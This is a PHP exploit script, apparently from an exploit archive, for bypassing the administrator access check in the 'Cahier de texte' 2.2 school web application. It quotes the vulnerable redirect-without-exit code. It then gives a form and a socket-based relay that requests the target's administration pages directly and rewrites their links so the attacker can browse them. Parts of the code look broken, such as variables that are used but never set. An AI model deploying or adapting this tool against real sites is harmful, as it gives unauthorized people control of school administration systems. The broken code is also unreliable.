Cahier de texte 2.2 Bypass General Access Protection Exploit
============================================================



<?
/*

  Informations
  ============
  Affected.scr..: Cahier de texte V2.2 (last version)
  Type..........: Bypass general access restriction
  Risk.level....: High
  Conditions....: None
  Src.download..: www.etab.ac-caen.fr/bsauveur/cahier_de_texte/
  Credits.......: DarkFig

  Vulnerable code
  ===============
  <?php session_start();
  if (isset($_SESSION[&#039;nom_prof&#039;])) { 
  if ($_SESSION[&#039;nom_prof&#039;]<>&#039;Administrateur&#039;) { header("Location: ../index.php");}
  ;} else { header("Location: ../index.php");}?>
  ...

*/

if(!isset($_GET[&#039;host&#039;]) || empty($_GET[&#039;host&#039;])) headers();
if(!isset($_GET[&#039;wanted&#039;])) $wanted = &#039;index.php&#039;;

$host = $_GET[&#039;host&#039;];
$prox = $_GET[&#039;prox&#039;];
$path = $_GET[&#039;path&#039;];
echo sockxp($host,$path,$prox,"administration/".$wanted);
exit(0);

function headers()
{
	print("<html>
<head>
 <title>Cahier de texte V2.2 Exploit</title>
</head>
<body>
 <form method=&#039;get&#039; action=&#039;".$_SERVER[&#039;PHP_SELF&#039;]."&#039;>
  <input type=&#039;text&#039; name=&#039;host&#039; value=&#039;host&#039;>
  <input type=&#039;text&#039; name=&#039;path&#039; value=&#039;path&#039;>
  <input type=&#039;text&#039; name=&#039;prox&#039; value=&#039;proxyhost:proxyport&#039;>
  <input type=&#039;submit&#039; value=&#039;Exploit&#039;>
 </form>
</body>
</html>");
	exit(0);
}

function sockxp($host,$path,$prox,$wanted)
{
	$hope = !empty($prox) ? $prox : $host.&#039;:80&#039;;
	$hosh = $hosta[1];
	$hosp = $hosta[2];
	
	$recv = &#039;&#039;;
	$meth = $_SERVER[&#039;REQUEST_METHOD&#039;];
	if(empty($hosh) || empty($hosp)) exit(1);

	if(!$sock = fsockopen($hosh,$hosp)) exit(1);
	$dat  = $meth." http://".$host;
	
	if($meth === "POST") $dat .= "/".str_replace("administration//","",$wanted);
	else $dat .= $path.$wanted;
	
	$dat .= " HTTP/1.1\r\n";
	$dat .= "Host: $host\r\n";
	$dat .= "Connection: Close\r\n";
	
	if($meth === "POST") {
		$postdata = get_postdata();
		$dat .= "Content-Type: application/x-www-form-urlencoded\r\n";
		$dat .= "Content-Length: ".strlen($postdata)."\r\n\r\n";
		$dat .= $postdata."\r\n\r\n";
	} else {
		$dat .= "\r\n";
	}

	fputs($sock,$dat);
	while(!feof($sock)) $recv .= fgets($sock);
	fclose($sock);

	return html_replace($recv);
}

function html_replace($htmlc)
{
	global $host,$path,$prox;
	$iniv = $_SERVER[&#039;PHP_SELF&#039;]."?host=$host&path=$path&prox=$prox&wanted=";
	$newc = str_replace("action=\"","action=\"$iniv",$htmlc);
	$newc = str_replace("=\"..","=\"http://${host}${path}administration/..",$newc);
	$newc = str_replace("a href=\"","a href=\"$iniv",$newc);
	$newc = str_replace("MM_goToURL(&#039;parent&#039;,&#039;","MM_goToURL(&#039;parent&#039;,&#039;$iniv",$newc);
	$newc = explode("\n",$newc);
	for($i=1;$i<count($newc);$i++) {
		if($v) $nnewc .= $newc[$i]."\n";
	}
	return $nnewc;
}

function get_postdata()
{
	$postdata = &#039;&#039;;
	foreach($_POST as $key => $value) {
		$postdata .= $key."=".$value."&";
	}
	return $postdata;
}
?>



